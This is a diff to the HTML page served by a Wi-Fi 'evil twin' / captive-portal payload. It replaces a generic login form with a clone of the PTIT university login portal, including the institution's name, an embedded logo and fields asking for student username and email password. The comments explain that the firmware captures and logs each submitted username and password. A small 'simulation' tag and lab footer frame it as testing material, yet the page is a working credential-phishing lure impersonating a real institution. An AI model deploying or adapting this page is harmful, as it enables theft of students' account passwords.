@@ -1,74 +1,115 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="vi">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-  <title>Đăng nhập Wi-Fi</title>
-  <!--
-    Trang mẫu cho payload `wifi_evil_portal` (PLAN §2.4).
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>HỌC VIỆN CÔNG NGHỆ BƯU CHÍNH VIỄN THÔNG</title>
+<!--
+  Trang portal cho payload `wifi_evil_portal` / `wifi_evil_twin` (PLAN §2.4).
+  Bố cục dựng lại theo trang đăng nhập captive portal của PTIT (header logo +
+  "Welcome to PTIT", hai trường Username/Password, nút CONNECT đỏ).
 
-    Thiết bị phục vụ file này từ LittleFS khi payload đang chạy; sửa file rồi
-    `pio run -t buildfs && pio run -t uploadfs` để nạp lại. Trang phải tự
-    chứa (không tải tài nguyên ngoài — AP không có Internet), form POST về
-    chính nó. Bản dựng phải nhỏ hơn 16 KB.
+  Ràng buộc (src/core/evil_twin.h): tự chứa, không tài nguyên ngoài (AP không
+  có Internet), POST về chính nó, nhỏ hơn 16384 byte — nên CSS nằm inline và
+  logo được nhúng base64 (logo gốc 509x490 nén còn ~90px, 64 màu).
 
-    Mỗi lần POST, payload giải mã các trường form và stream frame `evil_portal`
-    gồm `user`, `pass` (null nếu không có) và `body` thô; dashboard ghi
-    `Portal #n: <user> / <pass>` vào nhật ký (loại sự kiện "Thu thập").
+  Hai trường form giữ đúng tên mà firmware nhận dạng (`username`, `password`;
+  evilTwin::parseFormCredentials khớp không phân biệt hoa thường với
+  username/login/user/account/email + password/pass/pwd/passwd), nên dashboard
+  ghi `Portal #n: <username> / <password>`.
 
-    Cách dùng: bỏ nội dung trang muốn dùng vào đây. Tên trường nhận dạng được
-    (không phân biệt hoa thường): email/user/username/login/account/phone/msisdn
-    và password/pass/pwd/passwd — còn tên khác vẫn được gửi nguyên body thô, nên
-    đừng đổi tên nếu muốn log hiện tên đăng nhập.
-  -->
-  <style>
-    :root { color-scheme: light; }
-    * { box-sizing: border-box; }
-    body {
-      margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center;
-      font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
-      background: #eef1f5; color: #1f2933; padding: 24px;
-    }
-    .card {
-      width: 100%; max-width: 380px; background: #fff; border-radius: 14px; padding: 28px 24px;
-      box-shadow: 0 8px 24px rgba(15, 23, 42, .12);
-    }
-    .mark { display: flex; align-items: center; gap: 10px; margin-bottom: 18px; }
-    .dot { width: 14px; height: 14px; border-radius: 50%; background: #2f6fed; flex: none; }
-    h1 { font-size: 20px; margin: 0 0 4px; }
-    p.sub { margin: 0 0 20px; font-size: 14px; color: #5b6673; }
-    label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; }
-    input {
-      width: 100%; padding: 11px 12px; margin-bottom: 16px; font-size: 15px;
-      border: 1px solid #cbd2d9; border-radius: 8px; background: #fff;
-    }
-    input:focus { outline: 2px solid #2f6fed; outline-offset: 1px; border-color: #2f6fed; }
-    button {
-      width: 100%; padding: 12px; font-size: 15px; font-weight: 600; color: #fff;
-      background: #2f6fed; border: 0; border-radius: 8px; cursor: pointer;
-    }
-    button:active { background: #2559c4; }
-    .note { margin: 18px 0 0; font-size: 12px; color: #7b8794; text-align: center; }
-  </style>
+  Nhãn "MÔ PHỎNG" ở header giữ quyết định lab: trang không mạo danh tổ chức.
+  Nạp lại: pio run -t buildfs && pio run -t uploadfs
+-->
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; padding: 0; min-height: 100vh;
+    font-family: "Avant Garde", Tahoma, "Century Gothic", CenturyGothic, AppleGothic, sans-serif;
+    background: #55585c radial-gradient(circle at 50% 35%, #73767a 0, #4a4d51 60%, #3c3f42 100%);
+    color: #fff;
+  }
+  #header {
+    background: #fff; padding: 14px 0;
+    box-shadow: 0 1px 4px rgba(0, 0, 0, .25);
+  }
+  .branch {
+    width: min(760px, 92%); margin: 0 auto;
+    display: flex; align-items: center; gap: 12px;
+  }
+  .branch img { width: 90px; height: 87px; flex: none; }
+  .names { min-width: 0; }
+  .vi-name { display: block; color: #d7182a; font-weight: bold; font-size: 25px; line-height: 1.15; }
+  .en-name { display: block; color: #001789; font-size: 21px; line-height: 1.2; }
+  .lab {
+    margin-left: auto; flex: none; align-self: flex-start;
+    font-size: 11px; letter-spacing: .5px; color: #9aa0a6;
+    border: 1px solid #d7dade; border-radius: 4px; padding: 2px 6px;
+  }
+  main { width: min(600px, 92%); margin: 8vh auto 0; text-align: center; }
+  .welcome { color: #ff1b1b; font-size: 1.5em; font-weight: 550; margin: 0 0 5px; }
+  .brand {
+    display: inline-block; color: #d11616; font-size: 3.5em; font-weight: bold;
+    line-height: 1.1; border-bottom: 4px solid #d11616; padding-bottom: 2px;
+  }
+  form { width: 70%; margin: 24px auto 0; }
+  .row { display: flex; align-items: center; gap: 12px; margin-bottom: 14px; }
+  .row label { flex: none; width: 96px; text-align: right; font-weight: bold; color: #fff; font-size: 15px; }
+  .row input {
+    flex: 1; min-width: 0; height: 30px; border: 0; border-radius: 2px;
+    padding: 0 6px; font-size: 13px; font-family: Tahoma, sans-serif; color: #222;
+  }
+  .row input:focus { outline: 2px solid #001789; outline-offset: 1px; }
+  button {
+    display: block; margin: 22px auto 0; cursor: pointer;
+    padding: 12px 56px; border-radius: 40px;
+    border: 2px solid #efd4d4; background: #d7182a; color: #fff;
+    font: 700 20px/1 "Century Gothic", Tahoma, sans-serif; letter-spacing: 1px;
+  }
+  button:active { background: #b01222; }
+  .note { width: min(520px, 92%); margin: 26px auto 40px; font-size: 12px; line-height: 1.5; color: #dfe2e5; }
+  @media (max-width: 720px) {
+    .branch { width: 95%; gap: 8px; }
+    .branch img { width: 44px; height: 42px; }
+    .vi-name { font-size: 12px; }
+    .en-name { font-size: 10px; }
+    main { margin-top: 15vh; }
+    .brand { font-size: 2.6em; }
+    form { width: 100%; }
+    .row label { width: 84px; font-size: 14px; }
+  }
+</style>
 </head>
 <body>
-  <main class="card">
-    <div class="mark"><span class="dot"></span><strong>Wi-Fi</strong></div>
-    <h1>Đăng nhập để tiếp tục</h1>
-    <p class="sub">Mạng này yêu cầu xác thực trước khi truy cập Internet.</p>
+<header id="header">
+  <div class="branch">
+    <img src="data:image/png;base64,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" alt="PTIT">
+    <div class="names">
+      <span class="vi-name">HỌC VIỆN CÔNG NGHỆ BƯU CHÍNH VIỄN THÔNG</span>
+      <span class="en-name">Posts and Telecommunications Institute of Technology</span>
+    </div>
+    <span class="lab">MÔ PHỎNG</span>
+  </div>
+</header>
 
-    <form method="post" action="/">
-      <label for="email">Email hoặc tên đăng nhập</label>
-      <input id="email" name="email" type="text" autocomplete="off" autocapitalize="none"
-             autocorrect="off" spellcheck="false" required>
+<main>
+  <p class="welcome">Welcome to</p>
+  <div class="brand">PTIT</div>
+  <form method="post" action="/">
+    <div class="row">
+      <label for="u">Username :</label>
+      <input id="u" name="username" type="text" placeholder="Nhập username không có @stu.ptit.edu"
+             maxlength="25" autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false" required>
+    </div>
+    <div class="row">
+      <label for="p">Password :</label>
+      <input id="p" name="password" type="password" placeholder="Password email"
+             maxlength="25" autocomplete="off" required>
+    </div>
+    <button type="submit">CONNECT</button>
+  </form>
+</main>
 
-      <label for="password">Mật khẩu</label>
-      <input id="password" name="password" type="password" autocomplete="off" required>
-
-      <button type="submit">Kết nối</button>
-    </form>
-
-    <p class="note">Bài tập thử nghiệm trong môi trường được phép.</p>
-  </main>
+<p class="note">Trang lab — mô phỏng cổng đăng nhập để kiểm thử evil twin. Không gửi dữ liệu ra ngoài thiết bị.</p>
 </body>
 </html>
